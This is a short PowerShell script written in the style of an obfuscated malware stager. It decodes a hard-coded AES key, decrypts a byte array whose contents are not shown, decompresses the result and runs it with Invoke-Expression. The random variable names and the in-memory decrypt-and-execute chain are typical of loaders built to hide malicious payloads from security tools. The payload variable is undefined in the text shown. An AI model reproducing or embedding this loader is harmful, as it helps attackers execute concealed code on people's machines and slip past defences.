$wvcggne = [System.Convert]::FromBase64String("zisIusDeWmBR3gVrp64XYfkJK405MB9YPLxvdbqksj0=")
$jbyhgc = New-Object "System.Security.Cryptography.AesManaged"
$jbyhgc.KeySize = 128
$jbyhgc.Key = $wvcggne
$jbyhgc.IV = $zdqzsar[0..15]
$jbyhgc.Mode = [System.Security.Cryptography.CipherMode]::ECB
$jbyhgc.BlockSize = 128
$jbyhgc.Padding = [System.Security.Cryptography.PaddingMode]::ANSIX923
$evnbqfmz = New-Object System.IO.MemoryStream
$ypqkaxww = New-Object System.IO.MemoryStream(,$jbyhgc.CreateDecryptor().TransformFinalBlock($zdqzsar,16,$zdqzsar.Length-16))
$ygarq = New-Object System.IO.Compression.DeflateStream $ypqkaxww, ([IO.Compression.CompressionMode]::Decompress)
$ygarq.CopyTo($evnbqfmz)
$jbyhgc.Dispose()
$ypqkaxww.Close()
$ygarq.Close()
$uguvc = [System.Text.Encoding]::UTF8.GetString($evnbqfmz.ToArray())
Invoke-Expression($uguvc)